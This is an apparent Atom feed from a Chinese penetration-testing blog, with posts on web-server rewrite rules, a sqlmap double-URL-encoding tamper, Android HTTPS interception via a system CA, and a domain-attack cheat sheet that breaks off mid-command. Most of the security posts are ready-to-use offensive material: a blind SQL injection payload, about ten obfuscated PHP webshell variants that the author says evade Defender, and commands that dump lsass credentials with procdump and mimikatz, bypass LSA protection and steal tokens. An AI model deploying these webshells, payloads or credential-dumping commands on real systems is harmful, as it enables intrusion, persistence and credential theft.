break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果你的应用安装在二级目录，Nginx的伪静态方法设置如下，其中youdomain是所在的目录名称。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;youdomain&#x2F; &#123;</span><br><span class="line">    if (!-e $request_filename)&#123;</span><br><span class="line">        rewrite  ^&#x2F;youdomain&#x2F;(.*)$  &#x2F;youdomain&#x2F;index.php?s&#x3D;$1  last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>举个栗子：<br>如果你用的是本机电脑上的phpstudy环境的话，打开配置文件( nginx/conf/vhost.conf )：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    index  index.html index.htm index.php;</span><br><span class="line">    #autoindex  on;</span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite ^(.*)$ &#x2F;index.php?s&#x3D;$1 last; break;</span><br><span class="line">    &#125;            </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="IIS伪静态："><a href="#IIS伪静态：" class="headerlink" title="IIS伪静态："></a>IIS伪静态：</h1><ul><li>如果你的服务器环境支持ISAPI_Rewrite的话，可以配置httpd.ini文件，添加下面的内容：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule (.*)$ &#x2F;index\.php\?s&#x3D;$1 [I]</span><br></pre></td></tr></table></figure></li><li>在IIS的高版本下面可以配置web.config，在中间添加rewrite节点：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;rewrite&gt;</span><br><span class="line"> &lt;rules&gt;</span><br><span class="line"> &lt;rule name&#x3D;&quot;OrgPage&quot; stopProcessing&#x3D;&quot;true&quot;&gt;</span><br><span class="line"> &lt;match url&#x3D;&quot;^(.*)$&quot; &#x2F;&gt;</span><br><span class="line"> &lt;conditions logicalGrouping&#x3D;&quot;MatchAll&quot;&gt;</span><br><span class="line"> &lt;add input&#x3D;&quot;&#123;HTTP_HOST&#125;&quot; pattern&#x3D;&quot;^(.*)$&quot; &#x2F;&gt;</span><br><span class="line"> &lt;add input&#x3D;&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType&#x3D;&quot;IsFile&quot; negate&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line"> &lt;add input&#x3D;&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType&#x3D;&quot;IsDirectory&quot; negate&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;conditions&gt;</span><br><span class="line"> &lt;action type&#x3D;&quot;Rewrite&quot; url&#x3D;&quot;index.php?s&#x3D;&#123;R:1&#125;&quot; &#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;rule&gt;</span><br><span class="line"> &lt;&#x2F;rules&gt;</span><br><span class="line">&lt;&#x2F;rewrite&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Apache伪静态-即系统自带的-htaccess文件-：&quot;&gt;&lt;a href=&quot;#Apache伪静态-即系统自带的-htaccess文件-：&quot; class=&quot;headerlink&quot; title=&quot;Apache伪静态(即系统自带的.htaccess文件)：&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="其他" scheme="http://nice759.com/Categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="伪静态" scheme="http://nice759.com/tags/%E4%BC%AA%E9%9D%99%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap-doubleurlencode-tamper</title>
    <link href="http://nice759.com/2022/03/17/sqlmap-doubleurlencode-tamper/"/>
    <id>http://nice759.com/2022/03/17/sqlmap-doubleurlencode-tamper/</id>
    <published>2022-03-17T04:28:15.000Z</published>
    <updated>2022-03-17T09:22:17.171Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqlmap-DoubleUrlencode-tamper"><a href="#Sqlmap-DoubleUrlencode-tamper" class="headerlink" title="Sqlmap-DoubleUrlencode-tamper"></a>Sqlmap-DoubleUrlencode-tamper</h1><p>DoubleUrlencode for sqlmap tamper</p><p>在一次渗透测试过程中，遇到了两次Url编码的案例，因此改了一个简单的tamper</p><h1 id="Quoete"><a href="#Quoete" class="headerlink" title="Quoete()"></a>Quoete()</h1><ul><li>传入参数类型：字符串</li><li>功能：将单个字符串编码转化为 %xx 的形式</li><li>导入：from urllib.parse import quote</li><li>Ps：url多个字符串编码用urlenocde()函数<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2></li><li>payload: ‘ AND (SELECT 2634 FROM (SELECT(SLEEP(2-(IF((SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))=1,0,2)))))aoEO) AND ‘OpQi’=’OpQi</li></ul><p>sqlmap自带的urlencode效果<br><img src="https://user-images.githubusercontent.com/100123029/155446733-faa153e7-a949-4778-89d6-e90b7e5466de.png" alt="image"></p><ul><li><p>urlencode：/%27%20AND%20%28SELECT%202634%20FROM%20%28SELECT%28SLEEP%282-%28IF%28%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20super_priv%20FROM%20mysql.user%20WHERE%20user%3D0x726f6f74%20LIMIT%200%2C1%29%3D0x59%29%20THEN%201%20ELSE%200%20END%29%29%3D1%2C0%2C2%29%29%29%29%29aoEO%29%20AND%20%27OpQi%27%3D%27OpQi</p></li><li><p>doubleurlencode：%25%32%37%25%32%30%41%4e%44%25%32%30%25%32%38%53%45%4c%45%43%54%25%32%30%32%36%33%34%25%32%30%46%52%4f%4d%25%32%30%25%32%38%53%45%4c%45%43%54%25%32%38%53%4c%45%45%50%25%32%38%32%2d%25%32%38%49%46%25%32%38%25%32%38%53%45%4c%45%43%54%25%32%30%25%32%38%43%41%53%45%25%32%30%57%48%45%4e%25%32%30%25%32%38%25%32%38%53%45%4c%45%43%54%25%32%30%73%75%70%65%72%5f%70%72%69%76%25%32%30%46%52%4f%4d%25%32%30%6d%79%73%71%6c%2e%75%73%65%72%25%32%30%57%48%45%52%45%25%32%30%75%73%65%72%25%33%44%30%78%37%32%36%66%36%66%37%34%25%32%30%4c%49%4d%49%54%25%32%30%30%25%32%43%31%25%32%39%25%33%44%30%78%35%39%25%32%39%25%32%30%54%48%45%4e%25%32%30%31%25%32%30%45%4c%53%45%25%32%30%30%25%32%30%45%4e%44%25%32%39%25%32%39%25%33%44%31%25%32%43%30%25%32%43%32%25%32%39%25%32%39%25%32%39%25%32%39%25%32%39%61%6f%45%4f%25%32%39%25%32%30%41%4e%44%25%32%30%25%32%37%4f%70%51%69%25%32%37%25%33%44%25%32%37%4f%70%51%69</p></li><li><p>BP<br><img src="https://user-images.githubusercontent.com/100123029/155447021-079fb7df-962c-4fcf-9be0-7e383a3918b1.png" alt="image"></p></li><li><p>test.py<br><img src="https://user-images.githubusercontent.com/100123029/155448429-8c361ae5-c4bb-4b40-8167-090dbe0a09c4.png" alt="image"></p></li><li><p>tamper<br><img src="https://user-images.githubusercontent.com/100123029/155448629-4f26eacd-918d-48df-b6d3-5ce2e506306f.png" alt="image"></p></li><li><p>效果<br><img src="https://user-images.githubusercontent.com/100123029/155449152-7d2bb427-abe0-4290-9675-5cb0570ce86f.png" alt="image"></p></li><li><p>tamper地址：<a href="https://github.com/N1ce759/Sqlmap-DoubleUrlencode-tamper">https://github.com/N1ce759/Sqlmap-DoubleUrlencode-tamper</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Sqlmap-DoubleUrlencode-tamper&quot;&gt;&lt;a href=&quot;#Sqlmap-DoubleUrlencode-tamper&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap-DoubleUrlencode-tamper&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="python" scheme="http://nice759.com/Categories/python/"/>
    
    
    <category term="tamper" scheme="http://nice759.com/tags/tamper/"/>
    
    <category term="sqlmap" scheme="http://nice759.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>php一句话简单混淆</title>
    <link href="http://nice759.com/2022/03/17/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86/"/>
    <id>http://nice759.com/2022/03/17/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86/</id>
    <published>2022-03-17T03:28:15.000Z</published>
    <updated>2022-03-17T08:23:38.041Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>原始一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>php变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; &quot;assert&quot;;</span><br><span class="line">$a(@$_POST[&#39;shell&#39;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第三行使用了变量函数$a，变量储存了函数名asse，便可以直接用变量替代函数名。</p></li><li><p>php变量简单变形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a&#x3D;&quot;TR&quot;.&quot;Es&quot;.&quot;sA&quot;;  </span><br><span class="line">$b&#x3D;strtolower($a);  </span><br><span class="line">$c&#x3D;strrev($b);  </span><br><span class="line">@$c($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用字符串拼接、大小写混淆、字符串逆序组合而成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a&#x3D;&quot;AssERT&quot;;  </span><br><span class="line">$b&#x3D;strtolower($a);  </span><br><span class="line">@$b($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用大小写混淆配合字符串转小写函数strtolower组合而成</p></li><li><p>PHP可变变量(不好用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$bb&#x3D;&quot;assert&quot;;</span><br><span class="line">$a&#x3D;&#39;bb&#39;;</span><br><span class="line">$$aa($_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以上代码可表示为*$$aa = $($aa) = $ (‘bb’) = $bb = “assert”* </p></li><li><p>自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function fun($a)&#123;  </span><br><span class="line">    @eval($a);  </span><br><span class="line">&#125;  </span><br><span class="line">@fun($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用function自定义函数，然后函数来调用eval函数</p></li><li><p>create_function函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$fun &#x3D; create_function(&#39;&#39;,$_POST[&#39;shell&#39;]);</span><br><span class="line">$fun();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>创建了一个匿名函数，并返回了一个独一无二的函数名，然后再调用此函数</p></li><li><p>call_user_func()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@call_user_func(assert,$_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>call_user_func()函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数</p></li><li><p>base64_decode 函数（不好使）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">$a&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);  </span><br><span class="line">@a($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>YXNzZXJ0是assert的base64编码，base64_decode()是base64解密函数</p></li><li><p>preg_replace函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">    function fun()&#123;  </span><br><span class="line">        return $_POST[&#39;shell&#39;];  </span><br><span class="line">    &#125;  </span><br><span class="line">    @preg_replace(&quot;&#x2F;test&#x2F;e&quot;, fun(), &quot;test123&quot;);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行。<br>蚁剑最好用base64加解密</p></li><li><p>pares_str函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&quot;a&#x3D;eval&quot;;</span><br><span class="line">parse_str($str);</span><br><span class="line">$a($_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行pares_str函数后可以生成一个名为$a，值为”eval”的变量。</p></li><li><p>str_replace函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; str_replace(&quot;test&quot;, &quot;&quot;, &quot;astestsert&quot;);</span><br><span class="line">$a($_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此函数用于将第三个参数中的第一个参数替换为第二个参数</p></li></ul><p>以上的一句话可以过过Defender，bypasswaf还得更深入研究。<br>POST也可替换成GET，但同时shell的传递方式也要改为GET形式，在使用一句话木马时，也可以在前面加一个@来屏蔽错误，增加其隐蔽性。</p><ul><li>RE：<br><a href="https://www.cnblogs.com/linuxsec/articles/12078206.html">https://www.cnblogs.com/linuxsec/articles/12078206.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;原始一句话&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class</summary>
      
    
    
    
    <category term="PHP" scheme="http://nice759.com/Categories/PHP/"/>
    
    
    <category term="php" scheme="http://nice759.com/tags/php/"/>
    
    <category term="免杀" scheme="http://nice759.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>APP渗透：BP抓取安卓7+HTTPS流量</title>
    <link href="http://nice759.com/2022/03/17/APP%E6%B8%97%E9%80%8F%EF%BC%9ABP%E6%8A%93%E5%8F%96%E5%AE%89%E5%8D%937+HTTPS%E6%B5%81%E9%87%8F/"/>
    <id>http://nice759.com/2022/03/17/APP%E6%B8%97%E9%80%8F%EF%BC%9ABP%E6%8A%93%E5%8F%96%E5%AE%89%E5%8D%937+HTTPS%E6%B5%81%E9%87%8F/</id>
    <published>2022-03-17T02:28:15.000Z</published>
    <updated>2022-03-17T09:23:37.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h1><p>Android7以后，系统不再信任用户级的证书，只信任系统级的证书，所以要抓包就需要把我们的代理程序证书安装至Android的系统目录中。</p><h1 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h1><p>流行于百度，实测效果不是很好，所以又摸索了第二种方式，建议直接看点右边目录看第二种</p><h2 id="导出证书"><a href="#导出证书" class="headerlink" title="导出证书"></a>导出证书</h2><ul><li><p>BP导出证书<br><img src="https://s2.loli.net/2022/03/17/PbXvn6FgWO7jrN9.png" alt="图片.png"></p></li><li><p>保存为bp.cer<br><img src="https://s2.loli.net/2022/03/17/u8CF6UGyeWpfLjP.png" alt="图片.png"></p></li></ul><h2 id="制作证书"><a href="#制作证书" class="headerlink" title="制作证书"></a>制作证书</h2><ul><li><p>把刚刚得到的bp.cer证书放到kali或服务器，这一步需要用到openssl</p></li><li><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -subject_hash_old -in bp.cer</span><br></pre></td></tr></table></figure></li><li><p>结果如下：<br><img src="https://s2.loli.net/2022/03/17/lBZc1F9Krphdua7.png" alt="图片.png"></p></li><li><p>本地创建一个<strong>9a5ba575.0</strong>文件，把上面的结果复制进去<br><img src="https://s2.loli.net/2022/03/17/7cFfE3Ob4yKDx2G.png" alt="图片.png"></p></li><li><p>然后执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -text -in bp.cer -out 9a5ba575.0</span><br></pre></td></tr></table></figure></li><li><p>结果<br><img src="https://s2.loli.net/2022/03/17/djyqJ7gDBAozL9x.png" alt="图片.png"></p></li><li><p>将内容复制到刚刚创建的<strong>9a5ba575.0</strong>中<br><img src="https://s2.loli.net/2022/03/17/xb2ydBv5CD9IYWl.png" alt="图片.png"></p></li><li><p>接下来将这个证书导入到夜神模拟器中</p></li><li><p>首先需要安装一个<em>RE文件管理器</em>，这一步需要root权限</p></li><li><p>将证书放到**/system/etc/security/cacerts**中，即系统证书目录<br><img src="https://s2.loli.net/2022/03/17/VgOZA24ulkILYt9.png" alt="图片.png"></p></li><li><p>重启模拟器</p></li><li><p>代理配置</p></li><li><p>配置如下<br><img src="https://s2.loli.net/2022/03/17/oBNuZqvyhM4SwFL.png" alt="图片.png"></p></li><li><p>成功抓包<br><img src="https://s2.loli.net/2022/03/17/eiSQoKusJbR2CHz.png" alt="图片.png"></p></li></ul><h1 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h1><ul><li><p>从浏览器导出信任的.cer bp证书，需要浏览器先安装好bp证书，具体安装方式这里就不阐述了<br><img src="https://s2.loli.net/2022/03/17/MX56wJrzdpjoLeN.png" alt="图片.png"></p></li><li><p>直接丢到模拟器中安装<br><img src="https://s2.loli.net/2022/03/17/YIp7tWwCV8am2Fx.png" alt="图片.png"></p></li><li><p>在模拟器中找到设置-安全-从SD卡中安装<br><img src="https://s2.loli.net/2022/03/17/9gMYw7WaHsOkdxG.png" alt="图片.png"></p></li><li><p>安装完毕后在模拟器中下载re文件管理器</p></li><li><p>进入：**/data/misc/user/0/cacerts-added** 这个文件夹下（该目录存储的是用户自己安装的证书文件）<br><img src="https://s2.loli.net/2022/03/17/NE2SZcq7GPCagos.png" alt="图片.png"></p></li><li><p>复制该.0文件（文件名可能是不一样的）</p></li><li><p>复制到系统证书目录**/etc/security/cacerts** 下（re文件管理器需要挂载读写权限、模拟器中自带root管理授权即可）</p></li><li><p>修改wifi代理为这个证书设置的代理<br><img src="https://s2.loli.net/2022/03/17/VmgoBu8QXHT9ad7.png" alt="图片.png"></p></li></ul><p><strong>亲测这种方式比第一种管用</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Before&quot;&gt;&lt;a href=&quot;#Before&quot; class=&quot;headerlink&quot; title=&quot;Before&quot;&gt;&lt;/a&gt;Before&lt;/h1&gt;&lt;p&gt;Android7以后，系统不再信任用户级的证书，只信任系统级的证书，所以要抓包就需要把我们的代理程序证书安装</summary>
      
    
    
    
    <category term="APP渗透" scheme="http://nice759.com/Categories/APP%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="APP渗透" scheme="http://nice759.com/tags/APP%E6%B8%97%E9%80%8F/"/>
    
    <category term="BurpSuit" scheme="http://nice759.com/tags/BurpSuit/"/>
    
  </entry>
  
  <entry>
    <title>域渗透速查手册</title>
    <link href="http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
    <id>http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</id>
    <published>2022-03-14T08:49:53.000Z</published>
    <updated>2022-03-17T08:09:34.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-无凭证情况下"><a href="#1-无凭证情况下" class="headerlink" title="1.无凭证情况下"></a>1.无凭证情况下</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; # SMB 扫描存活主机</span><br><span class="line">nmap -sP -p &lt;ip&gt; # ping 扫描</span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; # 快速扫描</span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; # 检测 SMB 漏洞</span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; # 经典扫描</span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt; # 全扫描</span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; # UDP 扫描</span><br></pre></td></tr></table></figure><h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2><p>扫描后可以去先用已知漏洞打</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit&#x2F;multi&#x2F;misc&#x2F;java_rmi_server</span><br><span class="line">ms17-010：exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_enum</span><br><span class="line">jboss manager：exploit&#x2F;multi&#x2F;http&#x2F;tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">   findstr &#x2F;S &#x2F;I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin&#x2F;mssql&#x2F;mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>低权限可以做的事情</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe</span><br><span class="line">查找内容有 password 的文件：findstr &#x2F;si &#39;password&#39; *.txt *.xml *.docx</span><br><span class="line">Juicy Potato &#x2F; Lovely Potato</span><br><span class="line">PrintSpoofer</span><br><span class="line">RoguePotato</span><br><span class="line">SMBGhost CVE-2020-0796</span><br><span class="line">CVE-2021-36934 (HiveNightmare&#x2F;SeriousSAM)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="拥有本地管理员权限"><a href="#拥有本地管理员权限" class="headerlink" title="拥有本地管理员权限"></a>拥有本地管理员权限</h2><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">hashdump: post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --sam &#x2F; --lsa &#x2F; --ntds</span><br></pre></td></tr></table></figure><h3 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a>绕过LSA防护策略读取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect &#x2F;process:lsass.exe &#x2F;remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  &#x2F;process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </span><br></pre></td></tr></table></figure><h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure><p>之前粗略分析过 token</p><p><a href="https://0range-x.github.io/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/">Token窃取那些事 (0range-x.github.io)</a></p><h3 id="查看本地存储的所有密码"><a href="#查看本地存储的所有密码" class="headerlink" title="查看本地存储的所有密码"></a>查看本地存储的所有密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure><h3 id="卷影拷贝（获取域控所有hash）"><a href="#卷影拷贝（获取域控所有hash）" class="headerlink" title="卷影拷贝（获取域控所有hash）"></a>卷影拷贝（获取域控所有hash）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">diskshadow list shadows all</span><br><span class="line"></span><br><span class="line">mklink &#x2F;d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">管理员权限执行 </span><br><span class="line">vssadmin create shadow &#x2F;for&#x3D;C: </span><br><span 